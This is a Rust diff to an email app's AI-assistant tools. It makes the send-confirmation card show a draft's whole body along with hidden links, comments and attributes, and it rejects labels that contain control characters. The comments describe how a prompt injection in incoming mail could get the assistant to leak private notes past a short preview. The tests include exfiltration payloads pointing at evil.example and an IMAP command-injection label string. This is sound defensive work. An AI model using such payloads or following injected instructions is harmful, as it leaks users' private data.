@@ -744,6 +744,302 @@ fn first_lines(html: &str, max_lines: usize, max_chars: usize) -> String {
     lines.join(" ").chars().take(max_chars).collect()
 }
 
+/// How much of a message body or an event description a confirmation card
+/// carries, in characters -- far more than anybody writes by hand, so in
+/// practice the whole of it. The bound is there for the reply that quotes a
+/// whole newsletter, which would otherwise be sent to a phone as a dozen
+/// chat messages; see [`card_text`] for what is said in its place.
+const CARD_TEXT_CAP: usize = 20_000;
+
+/// A body that fits on the card's own line, as the short preview it once
+/// had -- see [`send_draft_card`].
+const CARD_INLINE_CHARS: usize = 160;
+
+/// `text` whole, for a confirmation card that is about to send it to
+/// somebody -- or, past [`CARD_TEXT_CAP`], as much as fits and then a line
+/// saying plainly how much was left out. `what` names the text in that
+/// line: "this message", "the description".
+///
+/// Whole, because a card that shows a preview is a card that can be
+/// written around: the send card once showed the first two lines of a body,
+/// so an instruction hidden in a stranger's mail could have the assistant
+/// add a person's private notes beneath them, and the person approved
+/// exactly what they saw.
+pub(super) fn card_text(text: &str, what: &str) -> String {
+    let total = text.chars().count();
+    if total <= CARD_TEXT_CAP {
+        return text.to_string();
+    }
+    let shown: String = text.chars().take(CARD_TEXT_CAP).collect();
+    format!(
+        "{}\n\n[{} more characters of {what} are not shown here]",
+        shown.trim_end(),
+        total - CARD_TEXT_CAP
+    )
+}
+
+/// A draft's HTML as its send card shows it: the words, a line per
+/// paragraph -- and the words in it that are not read on screen but reach
+/// the recipient all the same, since this is the last look anybody gets:
+/// where each link goes, each image's address and alt text, any comment,
+/// and any other attribute that carries an address (`style`'s `url()`, a
+/// `srcset`, a `background`) or words of its own (`title`, `data-*`,
+/// `aria-*`) -- a recipient's mail client fetches the first kind by itself,
+/// and the second is simply sent. Unlike [`strip_html`], which a comment or
+/// a `>` inside an attribute could hide text from.
+///
+/// Not a renderer, and not meant to be one: no parser, a malformed
+/// fragment degrades into more text shown rather than less, and styling
+/// that hides text on screen (`display:none`, white on white) is ignored,
+/// so that text is shown here too.
+fn html_for_card(html: &str) -> String {
+    let mut out = String::with_capacity(html.len());
+    // An open link's address, and where its text began in `out`.
+    let mut link: Option<(String, usize)> = None;
+    let mut rest = html;
+    while let Some(lt) = rest.find('<') {
+        push_card_text(&mut out, &rest[..lt]);
+        rest = &rest[lt..];
+        if let Some(after) = rest.strip_prefix("<!--") {
+            let (comment, tail) = after.split_once("-->").unwrap_or((after, ""));
+            let comment = comment.split_whitespace().collect::<Vec<_>>().join(" ");
+            if !comment.is_empty() {
+                out.push_str(&format!(" [comment, hidden when read: {comment}] "));
+            }
+            rest = tail;
+            continue;
+        }
+        // A `<` that cannot start a tag is text, as a browser reads it.
+        let starts_tag = |c: char| c.is_ascii_alphabetic() || matches!(c, '/' | '!' | '?');
+        if !rest[1..].starts_with(starts_tag) {
+            out.push('<');
+            rest = &rest[1..];
+            continue;
+        }
+        let end = tag_end(rest);
+        let tag = &rest[1..end];
+        rest = rest.get(end + 1..).unwrap_or("");
+
+        let closing = tag.starts_with('/');
+        let tag = tag.trim_start_matches('/');
+        let name_end = tag.find(|c: char| c.is_whitespace() || c == '/').unwrap_or(tag.len());
+        let (name, attrs) = (tag[..name_end].to_ascii_lowercase(), &tag[name_end..]);
+        match name.as_str() {
+            "br" | "p" | "div" | "tr" | "ul" | "ol" | "table" | "blockquote" | "pre" | "hr"
+            | "h1" | "h2" | "h3" | "h4" | "h5" | "h6" => out.push('\n'),
+            "li" if !closing => out.push_str("\n\u{2022} "),
+            "a" if !closing => {
+                close_link(&mut out, link.take());
+                let href = attribute(attrs, "href").unwrap_or_default().trim().to_string();
+                link = Some((href, out.len()));
+            }
+            "a" => close_link(&mut out, link.take()),
+            "img" => {
+                let src = attribute(attrs, "src").unwrap_or_default().trim();
+                let alt = attribute(attrs, "alt").unwrap_or_default().trim();
+                match (alt.is_empty(), src.is_empty()) {
+                    (true, true) => {}
+                    (true, false) => out.push_str(&format!("[image: {src}]")),
+                    (false, _) => out.push_str(&format!("[image \u{201c}{alt}\u{201d}: {src}]")),
+                }
+            }
+            _ => {}
+        }
+        if !closing {
+            for (attr, value) in attributes(attrs) {
+                let attr = attr.to_ascii_lowercase();
+                let shown_above = matches!(
+                    (name.as_str(), attr.as_str()),
+                    ("a", "href") | ("img", "src") | ("img", "alt")
+                );
+                let value = decode_entities(value.trim());
+                if !shown_above && !value.is_empty() && reaches_recipient(&attr, &value) {
+                    out.push_str(&format!(" [{attr}: {value}] "));
+                }
+            }
+        }
+    }
+    push_card_text(&mut out, rest);
+    close_link(&mut out, link);
+
+    // A line per paragraph, at most one blank line between two, nothing
+    // trailing.
+    let mut text = String::with_capacity(out.len());
+    let mut blank = 0;
+    for line in out.lines().map(str::trim) {
+        if line.is_empty() {
+            blank += 1;
+            continue;
+        }
+        if !text.is_empty() {
+            text.push_str(if blank > 0 { "\n\n" } else { "\n" });
+        }
+        text.push_str(line);
+        blank = 0;
+    }
+    text
+}
+
+/// End the link `open` names -- at its `</a>`, at the next `<a>` or at the
+/// end of the HTML, so that one never closed still says where it goes --
+/// adding its address after its text unless that text already is it.
+fn close_link(out: &mut String, open: Option<(String, usize)>) {
+    let Some((href, start)) = open else { return };
+    let said = out[start..].trim();
+    if !href.is_empty() && said != href && said != href.trim_start_matches("mailto:") {
+        out.push_str(&format!(" <{href}>"));
+    }
+}
+
+/// Text between tags, as a browser shows it: entities decoded and every run
+/// of whitespace -- line breaks in the source included -- one space.
+fn push_card_text(out: &mut String, text: &str) {
+    let decoded = decode_entities(text);
+    let mut words = decoded.split_whitespace();
+    let Some(first) = words.next() else {
+        if !decoded.is_empty() && !out.ends_with([' ', '\n']) {
+            out.push(' ');
+        }
+        return;
+    };
+    if decoded.starts_with(char::is_whitespace) && !out.ends_with([' ', '\n']) {
+        out.push(' ');
+    }
+    out.push_str(first);
+    for word in words {
+        out.push(' ');
+        out.push_str(word);
+    }
+    if decoded.ends_with(char::is_whitespace) {
+        out.push(' ');
+    }
+}
+
+/// The handful of entities a draft's HTML actually carries -- the five
+/// TipTap escapes, `&nbsp;`, and numeric references. Any other is left as
+/// written, which shows it rather than hides it.
+fn decode_entities(text: &str) -> String {
+    if !text.contains('&') {
+        return text.to_string();
+    }
+    let mut out = String::with_capacity(text.len());
+    let mut rest = text;
+    while let Some(amp) = rest.find('&') {
+        out.push_str(&rest[..amp]);
+        rest = &rest[amp..];
+        let decoded = rest.find(';').filter(|&semi| semi <= 10).and_then(|semi| {
+            let name = &rest[1..semi];
+            let c = match name {
+                "amp" => '&',
+                "lt" => '<',
+                "gt" => '>',
+                "quot" => '"',
+                "apos" | "#39" => '\'',
+                "nbsp" => ' ',
+                _ => match name.strip_prefix('#') {
+                    Some(hex) if hex.starts_with(['x', 'X']) => {
+                        char::from_u32(u32::from_str_radix(&hex[1..], 16).ok()?)?
+                    }
+                    Some(dec) => char::from_u32(dec.parse().ok()?)?,
+                    None => return None,
+                },
+            };
+            Some((c, semi + 1))
+        });
+        match decoded {
+            Some((c, len)) => {
+                out.push(c);
+                rest = &rest[len..];
+            }
+            None => {
+                out.push('&');
+                rest = &rest[1..];
+            }
+        }
+    }
+    out.push_str(rest);
+    out
+}
+
+/// Where the tag `rest` starts with ends: its closing `>`, skipping any
+/// inside a quoted attribute value -- `<a title="a > b">` is one tag -- or
+/// the end of the text for a tag never closed.
+fn tag_end(rest: &str) -> usize {
+    let mut quote = None;
+    let mut after_equals = false;
+    for (i, c) in rest.char_indices() {
+        if let Some(q) = quote {
+            if c == q {
+                quote = None;
+            }
+            continue;
+        }
+        match c {
+            '>' => return i,
+            '"' | '\'' if after_equals => quote = Some(c),
+            _ => {}
+        }
+        if !c.is_whitespace() {
+            after_equals = c == '=';
+        }
+    }
+    rest.len()
+}
+
+/// The value of attribute `wanted` among a tag's `attrs`, unquoted and not
+/// decoded. `None` if the tag does not have it.
+fn attribute<'h>(attrs: &'h str, wanted: &str) -> Option<&'h str> {
+    attributes(attrs).into_iter().find(|(name, _)| name.eq_ignore_ascii_case(wanted)).map(|a| a.1)
+}
+
+/// Every attribute among a tag's `attrs`, as `(name, value)`, values
+/// unquoted and not decoded; one with no value has `""`.
+fn attributes(attrs: &str) -> Vec<(&str, &str)> {
+    let mut out = Vec::new();
+    let mut rest = attrs;
+    loop {
+        rest = rest.trim_start_matches(|c: char| c.is_whitespace() || c == '/');
+        if rest.is_empty() {
+            return out;
+        }
+        let name_end =
+            rest.find(|c: char| c.is_whitespace() || c == '=' || c == '/').unwrap_or(rest.len());
+        let name = &rest[..name_end];
+        rest = rest[name_end..].trim_start();
+        let mut value = "";
+        if let Some(after) = rest.strip_prefix('=') {
+            let after = after.trim_start();
+            match after.chars().next() {
+                Some(q @ ('"' | '\'')) => {
+                    let inner = &after[1..];
+                    let close = inner.find(q).unwrap_or(inner.len());
+                    value = &inner[..close];
+                    rest = inner.get(close + 1..).unwrap_or("");
+                }
+                _ => {
+                    let close = after.find(char::is_whitespace).unwrap_or(after.len());
+                    value = &after[..close];
+                    rest = &after[close..];
+                }
+            }
+        }
+        out.push((name, value));
+    }
+}
+
+/// Whether an attribute is one the send card names beside the text: it
+/// carries an address a recipient's mail client may fetch by itself, or it
+/// is words that are sent without being shown.
+fn reaches_recipient(attr: &str, value: &str) -> bool {
+    let lower = value.to_ascii_lowercase();
+    lower.contains("://")
+        || lower.contains("url(")
+        || lower.starts_with("//")
+        || attr == "title"
+        || attr.starts_with("data-")
+        || attr.starts_with("aria-")
+}
+
 /// `thread_id` is `Some` for a reply -- the thread it answers, known the
 /// moment [`run_draft_reply`] or [`run_update_draft`] has the parent
 /// message in hand -- and `None` for a message started from nothing, which
@@ -1300,9 +1596,24 @@ fn draft_fingerprint(draft: &Draft) -> String {
 /// non-person origin touched `to`/`cc`/`bcc` since the person last saved
 /// this draft from compose, and this is the one sentence between that and
 /// an approval given to recipients nobody has actually looked at.
+///
+/// And carries the whole body -- see [`card_text`] and [`html_for_card`]
+/// for why, and for the one bound on it.
 fn describe_send_draft(ctx: &ToolContext<'_>, args: &Args<'_>) -> Option<String> {
     let id: DraftId = args.opt_id("draft_id", "draft").ok()??;
     let draft = ctx.vault.draft(id).ok()?;
+    Some(send_draft_card(&draft))
+}
+
+/// [`describe_send_draft`]'s card for `draft`: one line naming who it goes
+/// to and what it is called, then the body.
+///
+/// A body that is one short line stays on that first line, where its
+/// preview always was, so the everyday "Thanks, see you then" card looks as
+/// it did. Anything longer goes below it after a blank line, whole, which
+/// the chat panel draws as a block of its own (`ToolCard.svelte`) and the
+/// Matrix question quotes line by line.
+fn send_draft_card(draft: &Draft) -> String {
     let addresses =
         |list: &[Address]| list.iter().map(display_address).collect::<Vec<_>>().join(", ");
     let mut recipients = format!("to {}", addresses(&draft.to));
@@ -1313,13 +1624,16 @@ fn describe_send_draft(ctx: &ToolContext<'_>, args: &Args<'_>) -> Option<String>
         recipients
             .push_str(&format!(", Bcc (hidden from other recipients): {}", addresses(&draft.bcc)));
     }
-    let subject =
-        if draft.subject.trim().is_empty() { "(no subject)" } else { draft.subject.trim() };
-    let preview = first_lines(&draft.body_html, 2, 160);
-    let mut out = if preview.is_empty() {
+    // On one line whatever it holds, so that the first line of the card is
+    // always the whole of who and what, and the body always what follows.
+    let subject = super::one_line(&draft.subject);
+    let subject = if subject.is_empty() { "(no subject)".to_string() } else { subject };
+    let body = html_for_card(&draft.body_html);
+    let inline = !body.contains('\n') && body.chars().count() <= CARD_INLINE_CHARS;
+    let mut out = if body.is_empty() || !inline {
         format!("{recipients} \u{2014} {subject}")
     } else {
-        format!("{recipients} \u{2014} {subject} \u{2014} {preview}")
+        format!("{recipients} \u{2014} {subject} \u{2014} {body}")
     };
     if let Some(changed_by) = &draft.recipients_changed_by {
         out.push_str(&format!(
@@ -1332,8 +1646,12 @@ fn describe_send_draft(ctx: &ToolContext<'_>, args: &Args<'_>) -> Option<String>
     // refused, rather than silently carried out, if anything this
     // fingerprint covers moved between this card being built and the
     // person answering it.
-    out.push_str(&format!(" (fingerprint {})", draft_fingerprint(&draft)));
-    Some(out)
+    out.push_str(&format!(" (fingerprint {})", draft_fingerprint(draft)));
+    if !inline {
+        out.push_str("\n\n");
+        out.push_str(&card_text(&body, "this message"));
+    }
+    out
 }
 
 fn run_send_draft(ctx: &ToolContext<'_>, args: &Args<'_>) -> Result<Value> {
@@ -1568,6 +1886,7 @@ fn run_label_thread(ctx: &ToolContext<'_>, args: &Args<'_>) -> Result<Value> {
     let (thread, account) = thread_and_account(ctx, thread_id)?;
     require_permission(ctx, &account, Permission::Edit, "label_thread")?;
     let label = args.str("label")?.to_string();
+    check_label(args, &label)?;
     let remove = args.bool_or("remove", false);
     let kind = if remove { OpKind::Unlabel { label } } else { OpKind::Label { label } };
     let origin = origin_of(ctx);
@@ -1575,6 +1894,15 @@ fn run_label_thread(ctx: &ToolContext<'_>, args: &Args<'_>) -> Result<Value> {
     ctx.vault.apply_thread_ops(&[thread_id], kind, origin)?;
     after_write(ctx, account.id);
     done_thread(if remove { "unlabelled" } else { "labelled" }, &thread, thread_id)
+}
+
+/// Refuse a label that is empty or carries a control character, before
+/// anything is changed or queued -- see [`crate::mail::label_problem`].
+fn check_label(args: &Args<'_>, label: &str) -> Result<()> {
+    match crate::mail::label_problem(label) {
+        Some(problem) => Err(args.bad(format!("`label`: {problem}. Give just its name."))),
+        None => Ok(()),
+    }
 }
 
 fn run_move_thread(ctx: &ToolContext<'_>, args: &Args<'_>) -> Result<Value> {
@@ -1897,6 +2225,122 @@ mod tests {
             Origin::Assistant { conversation: "c".into() },
         );
         assert!(only_own_draft(&ctx, &assistants, "discard_draft").is_err());
+    }
+
+    // ---- send_draft's confirmation card ------------------------------------
+
+    fn draft_with_body(body_html: &str) -> Draft {
+        let mut draft = Draft::new(AccountId::new(), "me@example.com", Origin::Person);
+        draft.to = vec![Address::bare("friend@example.com")];
+        draft.subject = "Dinner".into();
+        draft.body_html = body_html.into();
+        draft
+    }
+
+    #[test]
+    fn a_one_line_body_stays_on_the_send_cards_own_line() {
+        let card = send_draft_card(&draft_with_body("<p>See you at eight.</p>"));
+        assert!(!card.contains('\n'), "{card}");
+        assert!(
+            card.starts_with(
+                "to friend@example.com \u{2014} Dinner \u{2014} See you at eight. (fingerprint "
+            ),
+            "{card}"
+        );
+        let empty = send_draft_card(&draft_with_body(""));
+        assert!(
+            empty.starts_with("to friend@example.com \u{2014} Dinner (fingerprint "),
+            "{empty}"
+        );
+    }
+
+    /// The card once showed two lines and 160 characters of the body, so
+    /// whatever an injected instruction had the assistant write below them
+    /// went out unread.
+    #[test]
+    fn the_send_card_carries_the_whole_body_below_its_first_line() {
+        let opening = "Thanks for the lovely evening, it was great to catch up after so long. ";
+        let html = format!(
+            "<p>{}</p><p>See you soon.</p><p></p><p>P.S. my notes: account 1234, door 9876.</p>",
+            opening.repeat(3).trim()
+        );
+        let card = send_draft_card(&draft_with_body(&html));
+        let (head, body) = card.split_once("\n\n").expect("a long body goes below the first line");
+        assert!(head.starts_with("to friend@example.com \u{2014} Dinner (fingerprint "), "{head}");
+        assert!(!head.contains("Thanks"), "the body is not repeated on the first line: {head}");
+        assert_eq!(
+            body,
+            format!(
+                "{}\n\nSee you soon.\n\nP.S. my notes: account 1234, door 9876.",
+                opening.repeat(3).trim()
+            )
+        );
+    }
+
+    #[test]
+    fn the_send_card_shows_what_the_html_sends_but_never_displays() {
+        let body = html_for_card(
+            "<p>Hi <a href=\"https://example.net/?d=secret\">here</a> &amp; <b>bye</b>.</p>\
+             <!-- the door code is 9876 -->\
+             <p style=\"display:none\">hidden words</p>\
+             <img alt=\"\" src='https://example.net/p.gif?x=1'>\
+             <p><a href=\"mailto:sam@example.com\">sam@example.com</a> a < b</p>",
+        );
+        assert!(body.contains("Hi here <https://example.net/?d=secret> & bye."), "{body}");
+        assert!(body.contains("the door code is 9876"), "{body}");
+        assert!(body.contains("hidden words"), "{body}");
+        assert!(body.contains("[image: https://example.net/p.gif?x=1]"), "{body}");
+        assert!(body.contains("sam@example.com a < b"), "a link that says where it goes: {body}");
+        assert!(!body.contains("<mailto:"), "{body}");
+    }
+
+    #[test]
+    fn the_send_card_names_every_address_and_word_an_attribute_carries() {
+        let body = html_for_card(
+            "<p style=\"background:URL(https://evil.example/?d=door-9876)\">See you soon.</p>\
+             <img srcset=\"https://evil.example/a.png 1x\">\
+             <table><tr><td background='//evil.example/t.gif'>x</td></tr></table>\
+             <span title=\"the door code is 9876\" data-note=\"and the alarm\">hi</span>\
+             <p style=\"color:red\">plain</p>",
+        );
+        for expected in [
+            "[style: background:URL(https://evil.example/?d=door-9876)]",
+            "[srcset: https://evil.example/a.png 1x]",
+            "[background: //evil.example/t.gif]",
+            "[title: the door code is 9876]",
+            "[data-note: and the alarm]",
+        ] {
+            assert!(body.contains(expected), "missing {expected}: {body}");
+        }
+        assert!(!body.contains("color:red"), "a style with no address is just styling: {body}");
+    }
+
+    #[test]
+    fn card_text_says_how_much_past_the_cap_is_not_shown() {
+        assert_eq!(card_text("short", "this message"), "short");
+        let long = "x".repeat(CARD_TEXT_CAP + 1234);
+        let shown = card_text(&long, "this message");
+        assert!(shown.starts_with(&"x".repeat(CARD_TEXT_CAP)));
+        assert!(!shown.starts_with(&"x".repeat(CARD_TEXT_CAP + 1)));
+        assert!(
+            shown.ends_with("[1234 more characters of this message are not shown here]"),
+            "{}",
+            &shown[CARD_TEXT_CAP..]
+        );
+    }
+
+    // ---- label_thread's label ----------------------------------------------
+
+    #[test]
+    fn check_label_refuses_line_breaks_and_other_control_characters() {
+        let value = json!({});
+        let args = Args::new("label_thread", &value);
+        assert!(check_label(&args, "Work").is_ok());
+        assert!(check_label(&args, "Say \"Hi\" \\ to Bob").is_ok());
+        for bad in ["x\r\nZ1 UID MOVE 1:* [Gmail]/Trash\r\nZ2", "a\nb", "a\rb", "a\0b", "", " "] {
+            let err = check_label(&args, bad).unwrap_err().to_string();
+            assert!(err.contains("label_thread"), "{bad:?}: {err}");
+        }
     }
 
     #[test]
